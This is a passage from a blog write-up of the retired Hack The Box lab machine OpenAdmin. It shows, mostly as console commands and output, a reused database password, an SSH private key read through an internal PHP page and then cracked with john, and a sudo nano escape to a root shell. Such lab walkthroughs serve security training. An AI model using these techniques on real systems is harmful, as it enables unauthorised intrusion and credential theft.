<span class="n">database_settings</span><span class="mf">.</span><span class="n">inc</span><span class="mf">.</span><span class="n">php</span>  <span class="n">motd</span><span class="mf">.</span><span class="n">txt</span><span class="mf">.</span><span class="n">example</span>  <span class="n">run_installer</span>
<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="o">@</span><span class="n">openadmin</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">ona</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">config</span><span class="err">$</span> <span class="n">cat</span> <span class="n">database_settings</span><span class="mf">.</span><span class="n">inc</span><span class="mf">.</span><span class="n">php</span>
<span class="o">&lt;?</span><span class="n">php</span>

<span class="nv">$ona_contexts</span><span class="o">=</span><span class="k">array</span> <span class="p">(</span>
  <span class="s1">'DEFAULT'</span> <span class="o">=&gt;</span>
  <span class="k">array</span> <span class="p">(</span>
    <span class="s1">'databases'</span> <span class="o">=&gt;</span>
    <span class="k">array</span> <span class="p">(</span>
      <span class="mi">0</span> <span class="o">=&gt;</span> 
      <span class="k">array</span> <span class="p">(</span>
        <span class="s1">'db_type'</span> <span class="o">=&gt;</span> <span class="s1">'mysqli'</span><span class="p">,</span>
        <span class="s1">'db_host'</span> <span class="o">=&gt;</span> <span class="s1">'localhost'</span><span class="p">,</span>
        <span class="s1">'db_login'</span> <span class="o">=&gt;</span> <span class="s1">'ona_sys'</span><span class="p">,</span>
        <span class="s1">'db_passwd'</span> <span class="o">=&gt;</span> <span class="s1">'n1nj4W4rri0R!'</span><span class="p">,</span>
        <span class="s1">'db_database'</span> <span class="o">=&gt;</span> <span class="s1">'ona_default'</span><span class="p">,</span>
        <span class="s1">'db_debug'</span> <span class="o">=&gt;</span> <span class="kc">false</span><span class="p">,</span>
      <span class="p">),</span>
    <span class="p">),</span>
    <span class="s1">'description'</span> <span class="o">=&gt;</span> <span class="s1">'Default data context'</span><span class="p">,</span>
    <span class="s1">'context_color'</span> <span class="o">=&gt;</span> <span class="s1">'#D3DBFF'</span><span class="p">,</span>
  <span class="p">),</span>
<span class="p">);</span>

<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>And we are lucky to get credentials for the mysql database.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="go">User: ona_sys
Password: n1nj4W4rri0R!
</span></pre></table></code></div></div><p>Let’s see if the password got reused by any of the known accounts.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="gp">www-data@openadmin:/var/www/html/ona/local/config$</span><span class="w"> </span>su - jimmy
<span class="go">Password:
</span><span class="gp">jimmy@openadmin:~$</span><span class="w">
</span></pre></table></code></div></div><h1 id="privilege-escalation-to-joanna">Privilege Escalation to joanna</h1><p>Bingo! Now that we are successfully escalated to jimmy, let’s check out the internal directory.</p><p>In the <code class="language-plaintext highlighter-rouge">main.php</code> file we get a hint that the file runs on an webserver and is able to cat out the <strong>ssh private key</strong> of joanna.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="gp">jimmy@openadmin:/var/www/internal$</span><span class="w"> </span><span class="nb">cat </span>main.php 
<span class="gp">&lt;?php session_start();</span><span class="w"> </span><span class="k">if</span> <span class="o">(!</span>isset <span class="o">(</span><span class="nv">$_SESSION</span><span class="o">[</span><span class="s1">'username'</span><span class="o">]))</span> <span class="o">{</span> header<span class="o">(</span><span class="s2">"Location: /index.php"</span><span class="o">)</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span> 
<span class="gp">#</span><span class="w"> </span>Open Admin Trusted
<span class="gp">#</span><span class="w"> </span>OpenAdmin
<span class="gp">$</span>output <span class="o">=</span> shell_exec<span class="o">(</span><span class="s1">'cat /home/joanna/.ssh/id_rsa'</span><span class="o">)</span><span class="p">;</span>
<span class="gp">echo "&lt;pre&gt;</span><span class="nv">$output</span>&lt;/pre&gt;<span class="s2">";
</span><span class="gp">?&gt;</span><span class="w">
</span><span class="gp">&lt;html&gt;</span><span class="w">
</span><span class="gp">&lt;h3&gt;</span><span class="s2">Don't forget your "</span>ninja<span class="s2">" password&lt;/h3&gt;
</span><span class="gp">Click here to logout &lt;a href="logout.php" tite = "Logout"&gt;</span><span class="s2">Session
</span><span class="gp">&lt;/html&gt;</span><span class="w">
</span></pre></table></code></div></div><p>In our nmap we couldn’t find any other port or webserver so let’s see if there is something listening on <code class="language-plaintext highlighter-rouge">127.0.0.1</code> aka the <strong>localhost</strong>.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="gp">jimmy@openadmin:~$</span><span class="w"> </span>ss <span class="nt">-tulpn</span>
<span class="go">Netid  State    Recv-Q   Send-Q      Local Address:Port      Peer Address:Port
udp    UNCONN   0        0           127.0.0.53%lo:53             0.0.0.0:*
tcp    LISTEN   0        80              127.0.0.1:3306           0.0.0.0:*
tcp    LISTEN   0        128             127.0.0.1:52846          0.0.0.0:*
tcp    LISTEN   0        128         127.0.0.53%lo:53             0.0.0.0:*
tcp    LISTEN   0        128               0.0.0.0:22             0.0.0.0:*
tcp    LISTEN   0        128                     *:80                   *:*
tcp    LISTEN   0        128                  [::]:22                [::]:*
</span></pre></table></code></div></div><p>The interesting port here is the high port <code class="language-plaintext highlighter-rouge">TCP/52846</code> which we immediately throw a curl at to see if we can get the <strong>private key</strong>.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre><td class="rouge-code"><pre><span class="gp">jimmy@openadmin:/var/www$</span><span class="w"> </span>curl 127.0.0.1:52846/main.php
<span class="gp">&lt;pre&gt;</span><span class="nt">-----BEGIN</span> RSA PRIVATE KEY-----
<span class="go">Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
</span><span class="gp">&lt;/pre&gt;</span>&lt;html&gt;
<span class="gp">&lt;h3&gt;</span>Don<span class="s1">'t forget your "ninja" password&lt;/h3&gt;
</span><span class="gp">Click here to logout &lt;a href="logout.php" tite = "Logout"&gt;</span><span class="s1">Session
</span><span class="gp">&lt;/html&gt;</span><span class="w">
</span></pre></table></code></div></div><p>Perfect! Now we save the key in a file on our local system and use john to convert it into a readable format which we can crack.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">sudo</span> /usr/share/john/ssh2john.py joanna_id_rsa <span class="o">&gt;</span> joanna_id_rsa_hash
</pre></table></code></div></div><p>With this done, it’s time to crack the key.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">sudo </span>john joanna_id_rsa_hash <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt
<span class="go">Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (joanna_id_rsa)
1g 0:00:00:07 DONE (2020-11-10 19:25) 0.1347g/s 1932Kp/s 1932Kc/s 1932KC/sa6_123..*7¡Vamos!
Session completed
</span></pre></table></code></div></div><p>Awesome! We get the password.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="go">Password: bloodninjas
</span></pre></table></code></div></div><p>Change the file permission on the key - like always.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">chmod </span>600 joanna_id_rsa
</pre></table></code></div></div><p>And login as joanna to grab the user flag.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>ssh <span class="nt">-i</span> joanna_id_rsa joanna@10.10.10.171
<span class="go">load pubkey "joanna_id_rsa": invalid format
Enter passphrase for key 'joanna_id_rsa':
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Nov 10 18:34:55 UTC 2020

  System load:  0.32              Processes:             125
  Usage of /:   49.6% of 7.81GB   Users logged in:       0
  Memory usage: 19%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

41 packages can be updated.
12 updates are security updates.


Last login: Thu Jan  2 21:12:40 2020 from 10.10.14.3
</span></pre></table></code></div></div><h2 id="usertxt"><span class="mr-2">user.txt</span><a href="#usertxt" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">joanna@openadmin:~$</span><span class="w"> </span><span class="nb">cat </span>user.txt
<span class="go">c9b2cf07d40807e62af62660f0c81b5f
</span></pre></table></code></div></div><h1 id="the-way-to-root">The way to root</h1><p>We start with having a look at the group memberships.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">joanna@openadmin:~$</span><span class="w"> </span><span class="nb">id</span>
<span class="go">uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)
</span></pre></table></code></div></div><p>So joanna doens’t seems to have any special memberships so far. Let’s try if joanna has an entry in the <strong>sudors</strong> file.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="gp">joanna@openadmin:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="go">Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
</span></pre></table></code></div></div><p>Well that’s the case. The user joanna is able to execute the nano binary with root privileges in <code class="language-plaintext highlighter-rouge">/opt/priv</code> which means that we can create a file in there.</p><p>Let’s have a look at <strong>GTFObins</strong> if we can find some useful information to execute a root shell.</p><blockquote><p>https://gtfobins.github.io/gtfobins/nano/</p></blockquote><p>Now we try to get this running.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">joanna@openadmin:~$</span><span class="w"> </span><span class="nb">sudo</span> /bin/nano /opt/priv
</pre></table></code></div></div><p>We press <strong>Ctrl+r</strong> and then <strong>Ctrl+x</strong>.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="go">Command to execute:
^G Get Help						^X Read File
^C Cancel						M-F New Buffer
</span></pre></table></code></div></div><p>Then we enter <code class="language-plaintext highlighter-rouge">reset; sh 1&gt;&amp;0 2&gt;&amp;0</code> and press enter to execute it.</p><p>As we can see we spawned a shell out of nano.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="gp">Command to execute: reset;</span><span class="w"> </span>sh 1&gt;&amp;0 2&gt;&amp;0#
<span class="gp">#</span><span class="w"> </span><span class="nb">id</span>
<span class="go">uid=0(root) gid=0(root) groups=0(root)
</span></pre></table></code></div></div><h2 id="roottxt"><span class="mr-2">root.txt</span><a href="#roottxt" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>All what we have to do is to grab the root flag and that’s it!</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">#</span><span class="w"> </span><span class="nb">cat</span> /root/root.txt
<span class="go">2f907ed450b361b2c2bf4e8795d5b561
</span></pre></table></code></div></div><p>THE END</p><h1 id="resources">Resources</h1><div class="table-wrapper"><table><thead><tr><th style="text-align: left">Topic<th style="text-align: left">URL<tbody><tr><td style="text-align: left">OpenNetAdmin 18.1.1 - Remote Code Execution<td style="text-align: left"><a href="https://www.exploit-db.com/exploits/4769">click here</a><tr><td style="text-align: left">GTFOBins - nano<td style="text-align: left"><a href="https://gtfobins.github.io/gtfobins/nano/">click here</a></table></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/htb/'>HTB</a>, <a href='/categories/retired/'>retired</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://x.com/intent/tweet?text=OpenAdmin+Writeup+-+0xsyr0&url=%2Fposts%2Fopenadmin%2F" data-toggle="tooltip" data-placement="top" title="X" target="_blank" rel="noopener" aria-label="X"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=OpenAdmin+Writeup+-+0xsyr0&u=%2Fposts%2Fopenadmin%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=%2Fposts%2Fopenadmin%2F&text=OpenAdmin+Writeup+-+0xsyr0" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/openadmin/">OpenAdmin Writeup</a><li><a href="/posts/academy/">Academy Writeup</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writeup/">writeup</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/academy/"><div class="card-body"> <em class="small" data-ts="1613954336" data-df="ll" > Feb 22, 2021 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Academy Writeup</h3><div class="text-muted small"><p> Information@academy:~$ Column Detail Name Academy IP 10.10.10.215 Points 20 OS ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"><div class="btn btn-outline-primary disabled" prompt="Older"><p>-</p></div><a href="/posts/academy/" class="btn btn-outline-primary" prompt="Newer"><p>Academy Writeup</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://github.com/0xsyr0">0xsyr0</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writeup/">writeup</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
